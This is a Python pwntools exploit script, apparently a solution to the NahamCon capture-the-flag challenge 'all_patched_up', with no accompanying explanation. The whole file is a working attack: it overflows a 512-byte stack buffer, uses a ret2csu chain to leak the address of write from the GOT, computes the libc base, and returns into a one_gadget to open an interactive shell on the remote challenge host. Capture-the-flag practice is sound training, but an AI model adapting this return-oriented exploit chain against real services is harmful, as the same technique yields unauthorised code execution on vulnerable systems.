#!/usr/bin/env python3

from pwn import *

exe = ELF("./all_patched_up_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challenge.nahamcon.com", 32244)

    return r


def main():
    r = conn()
    
    csu1 = 0x000000000040124A 
    csu2 = 0x0000000000401230
    
    payload = 512*b'A'
    payload += p64(0)
    payload += p64(csu1)
    payload += p64(0)
    payload += p64(1)
    payload += p64(1)
    payload += p64(exe.got['write'])
    payload += p64(6)
    payload += p64(exe.got['write'])
    payload += p64(csu2)
    payload += p64(0)*7
    payload += p64(exe.sym['main'])
    
    r.sendafter(b'> ', payload)
    leak = r.recv(6)
    leak = u64(leak.ljust(8,b'\x00'))
    print("write leak: " + hex(leak))
    
    libc.address = leak - libc.sym['write']
    print("libc base: " + hex(libc.address))
    
    one_gadget = 0xe3afe + libc.address
    
    payload = 512*b'A'
    payload += p64(0)
    payload += p64(csu1)
    payload += p64(0)*6
    payload += p64(one_gadget)
    r.sendafter(b'> ', payload)
    r.interactive()


if __name__ == "__main__":
    main()
